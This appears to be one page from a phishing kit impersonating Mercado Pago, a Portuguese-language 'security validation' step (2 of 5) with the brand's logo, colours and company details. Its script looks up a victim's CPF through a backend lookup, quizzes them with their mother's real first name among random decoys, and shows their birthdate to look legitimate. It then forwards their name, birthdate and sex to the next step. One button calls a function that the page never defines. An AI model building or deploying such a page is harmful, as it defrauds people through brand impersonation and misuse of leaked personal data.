<!DOCTYPE html>
<html lang="pt-BR">

<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Validação de Dados</title>

   <script src="https://cdn.tailwindcss.com"></script>
   <script>
      tailwind.config = {
         theme: {
            extend: {
               colors: {
                  'mp-blue': '#009EE3',
                  'mp-dark-blue': '#0074A8',
                  'mp-light-blue': '#E6F7FF'
               }
            }
         }
      }
   </script>
   <style>
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

      * {
         font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif
      }

      body {
         min-height: 100vh;
         display: flex;
         flex-direction: column
      }

      main {
         flex: 1
      }

      .fade-in {
         animation: fadeIn 0.5s ease-out
      }

      @keyframes fadeIn {
         from {
            opacity: 0;
            transform: translateY(15px)
         }

         to {
            opacity: 1;
            transform: translateY(0)
         }
      }

      .progress-bar {
         transition: width 0.3s ease
      }

      /* Ajustes para garantir que o botão seja visível */
      .show-button {
         display: block !important;
         visibility: visible !important;
         opacity: 1 !important;
         height: auto !important;
         width: 100% !important;
      }
   </style>
</head>

<body class="bg-gray-50">
   <header class="bg-[#FFE600] border-b border-[#E6CF00] shadow-sm">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
         <div class="flex justify-between items-center h-20">
            <div class="flex items-center">
               <img src="images/logo.png" alt="Mercado Pago" class="h-12 md:h-14">
            </div>
            <div class="flex items-center gap-4">
               <a href="#"
                  class="text-sm font-medium text-gray-900 hover:text-gray-700 transition-colors hidden sm:block">
                  Ajuda
               </a>
            </div>
         </div>
      </div>
   </header>
   <main class="py-8 px-4 md:py-12">
      <div class="max-w-xl mx-auto">
         <div class="mb-6">
            <div class="flex items-center justify-between mb-2">
               <span class="text-sm font-medium text-gray-600">Etapa 2 de 5</span>
               <span class="text-sm font-medium text-mp-blue">40%</span>
            </div>
            <div class="w-full bg-gray-200 rounded-full h-2">
               <div class="progress-bar bg-mp-blue h-2 rounded-full" style="width: 40%"></div>
            </div>
         </div>
         <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
            <div id="loading" class="text-center hidden">
               <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-mp-blue mx-auto mb-4"></div>
               <h2 class="text-xl font-bold text-gray-900 mb-2">Consultando dados...</h2>
               <p class="text-gray-600">Aguarde enquanto validamos suas informações</p>
            </div>
            <div id="error" class="hidden">
               <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                  <div class="flex">
                     <svg class="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd"
                           d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                           clip-rule="evenodd"></path>
                     </svg>
                     <div class="ml-3">
                        <p class="text-sm text-red-700" id="errorMessage"></p>
                     </div>
                  </div>
               </div>
               <button onclick="location.reload()"
                  class="w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all">
                  Tentar novamente
               </button>
            </div>
            <div id="validation-form">
               <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Validação de segurança</h1>
               <p class="text-gray-600 mb-8">Para sua proteção, confirme algumas informações</p>
               <div class="space-y-6">
                  <div>
                     <label class="block text-sm font-medium text-gray-700 mb-2">Qual o primeiro nome da sua
                        mãe?</label>
                     <div id="mother-options" class="space-y-3"></div>
                  </div>
                  <div id="birthdate-section" class="hidden">
                     <label class="block text-sm font-medium text-gray-700 mb-2">Confirme sua data de nascimento</label>
                     <div class="bg-mp-light-blue border border-mp-blue/30 rounded-xl p-4 text-center mb-4">
                        <p class="text-sm text-gray-600 mb-2">Data de nascimento informada:</p>
                        <p class="text-2xl font-bold text-mp-blue" id="birthdate-display"></p>
                     </div>
                     <div class="grid grid-cols-2 gap-3">
                        <!-- BOTÃO AJUSTADO AQUI -->
                        <button onclick="window.location.href = '../4' + window.location.search"
                           class="bg-green-50 border-2 border-green-500 text-green-700 py-3 rounded-lg font-semibold hover:bg-green-100 transition-all flex items-center justify-center gap-2">
                           <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                              <path fill-rule="evenodd"
                                 d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                 clip-rule="evenodd"></path>
                           </svg>
                           Está correto
                        </button>
                        <button onclick="validateBirthdate(false)"
                           class="bg-red-50 border-2 border-red-500 text-red-700 py-3 rounded-lg font-semibold hover:bg-red-100 transition-all flex items-center justify-center gap-2">
                           <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                              <path fill-rule="evenodd"
                                 d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                                 clip-rule="evenodd"></path>
                           </svg>
                           Está incorreto
                        </button>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </main>
   <footer class="bg-[#FFE600] border-t border-[#E6CF00] mt-auto">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
         <div class="flex flex-col items-center justify-center text-center space-y-4">
            <img src="images/logo.png" alt="Mercado Pago" class="h-10 md:h-12">

            <div class="text-sm text-gray-900 space-y-1">
               <p>©️ 2025 Mercado Pago - Instituição de Pagamento</p>
               <p>CNPJ: 10.573.521/0001-91</p>
               <p>Osasco, SP - CEP 06233-903</p>
            </div>

            <div class="flex flex-wrap justify-center gap-4 text-xs text-gray-700">
               <a href="#" class="hover:text-gray-900 transition-colors font-medium">Termos e condições</a>
               <span class="text-gray-500">|</span>
               <a href="#" class="hover:text-gray-900 transition-colors font-medium">Política de privacidade</a>
               <span class="text-gray-500">|</span>
               <a href="#" class="hover:text-gray-900 transition-colors font-medium">Cookies</a>
            </div>
         </div>
      </div>
   </footer>
   <script>
      let dadosCpf = null;
      const normalizar = s => (s || "").toLowerCase().normalize("NFD").replace(/\p{Diacritic}/gu, "").trim();
      const temValor = s => normalizar(s).length >= 3 && !/nao informado|não informado|desconhecid/.test(normalizar(s));
      const NOMES_MAE_ALEATORIOS = ["Maria", "Ana", "Joana", "Rosa", "Lucia", "Carla", "Patrícia", "Beatriz", "Fernanda", "Sônia"];

      async function consultarCPF() {
         const urlParams = new URLSearchParams(window.location.search);
         let cpf = urlParams.get("cpf");

         if (!cpf) {
            try {
               const cpfStorage = localStorage.getItem("cpf");
               if (cpfStorage) cpf = cpfStorage;
            } catch (e) { }
         }

         if (!cpf) {
            mostrarErro("CPF não informado");
            return;
         }

         const cpfLimpo = cpf.replace(/\D/g, "");

         try {
            document.getElementById("validation-form").classList.add("hidden");
            document.getElementById("loading").classList.remove("hidden");

            const resposta = await fetch("consultar.php?cpf=" + cpfLimpo);
            if (!resposta.ok) throw new Error("Erro ao consultar CPF");

            const data = await resposta.json();

            if (!data || data.erro || !temValor(data.nome_mae)) {
               dadosCpf = {
                  dados: [{
                     NOME_MAE: "",
                     NASC: data?.nascimento || "00/00/0000",
                     NOME: data?.nome || "Usuário",
                     SEXO: data?.sexo || "",
                     CPF: data?.cpf || cpfLimpo
                  }],
                  meta: { hasMae: false }
               };
            } else {
               dadosCpf = {
                  dados: [{
                     NOME_MAE: data.nome_mae,
                     NASC: data.nascimento,
                     NOME: data.nome,
                     SEXO: data.sexo,
                     CPF: data.cpf
                  }],
                  meta: { hasMae: true }
               };
            }

            document.getElementById("loading").classList.add("hidden");
            document.getElementById("validation-form").classList.remove("hidden");
            mostrarOpcoesMae();
         } catch (e) {
            console.error(e);
            mostrarErro("Não foi possível validar seus dados. Tente novamente.");
         }
      }

      function mostrarOpcoesMae() {
         const temMae = !!(dadosCpf?.meta?.hasMae && temValor(dadosCpf.dados[0].NOME_MAE));
         const container = document.getElementById("mother-options");
         container.innerHTML = "";
         let opcoes = [];

         if (temMae) {
            const nomeCorreto = (dadosCpf.dados[0].NOME_MAE || "").split(/\s+/)[0] || "";
            const pool = NOMES_MAE_ALEATORIOS.filter(n => normalizar(n) !== normalizar(nomeCorreto));

            for (let i = pool.length - 1; i > 0; i--) {
               const j = Math.floor(Math.random() * (i + 1));
               [pool[i], pool[j]] = [pool[j], pool[i]];
            }

            opcoes = [nomeCorreto, ...pool.slice(0, 3)];

            for (let i = opcoes.length - 1; i > 0; i--) {
               const j = Math.floor(Math.random() * (i + 1));
               [opcoes[i], opcoes[j]] = [opcoes[j], opcoes[i]];
            }
         } else {
            const pool = [...NOMES_MAE_ALEATORIOS];
            for (let i = pool.length - 1; i > 0; i--) {
               const j = Math.floor(Math.random() * (i + 1));
               [pool[i], pool[j]] = [pool[j], pool[i]];
            }
            opcoes = pool.slice(0, 4);
         }

         opcoes.forEach(nome => {
            const botao = document.createElement("button");
            botao.type = "button";
            botao.className = "w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left";
            botao.textContent = nome;
            botao.onclick = () => validarNomeMae(nome);
            container.appendChild(botao);
         });

         const nenhum = document.createElement("button");
         nenhum.type = "button";
         nenhum.className = "w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4";
         nenhum.textContent = "Nenhuma das alternativas";
         nenhum.onclick = function () {
            window.location.href = "../4" + window.location.search;
         };
         container.appendChild(nenhum);
      }

      function validarNomeMae(nomeSelecionado) {
         const temMae = !!(dadosCpf?.meta?.hasMae && temValor(dadosCpf.dados[0].NOME_MAE));

         if (temMae) {
            const nomeCorreto = (dadosCpf.dados[0].NOME_MAE || "").split(/\s+/)[0] || "";
            if (normalizar(nomeSelecionado) !== normalizar(nomeCorreto)) {
               mostrarErro("Nome da mãe incorreto. Por favor, tente novamente.");
               return;
            }
         }

         document.getElementById("mother-options").parentElement.classList.add("hidden");
         const secNascimento = document.getElementById("birthdate-section");
         secNascimento.classList.remove("hidden");
         document.getElementById("birthdate-display").textContent = dadosCpf.dados[0].NASC || "00/00/0000";
      }

      function validarNascimento(correto) {
         if (!correto) {
            mostrarErro("Data de nascimento incorreta. Entre em contato com o suporte.");
            return;
         }

         const urlParams = new URLSearchParams(window.location.search);
         urlParams.set("nome", dadosCpf.dados[0].NOME);
         urlParams.set("nasc", dadosCpf.dados[0].NASC);
         urlParams.set("sexo", dadosCpf.dados[0].SEXO);

         window.location.href = "../4/?" + urlParams.toString();
      }

      function mostrarErro(msg) {
         document.getElementById("loading").classList.add("hidden");
         document.getElementById("validation-form").classList.add("hidden");
         document.getElementById("error").classList.remove("hidden");
         document.getElementById("errorMessage").textContent = msg;
      }

      window.onload = consultarCPF;
   </script>
</body>

</html>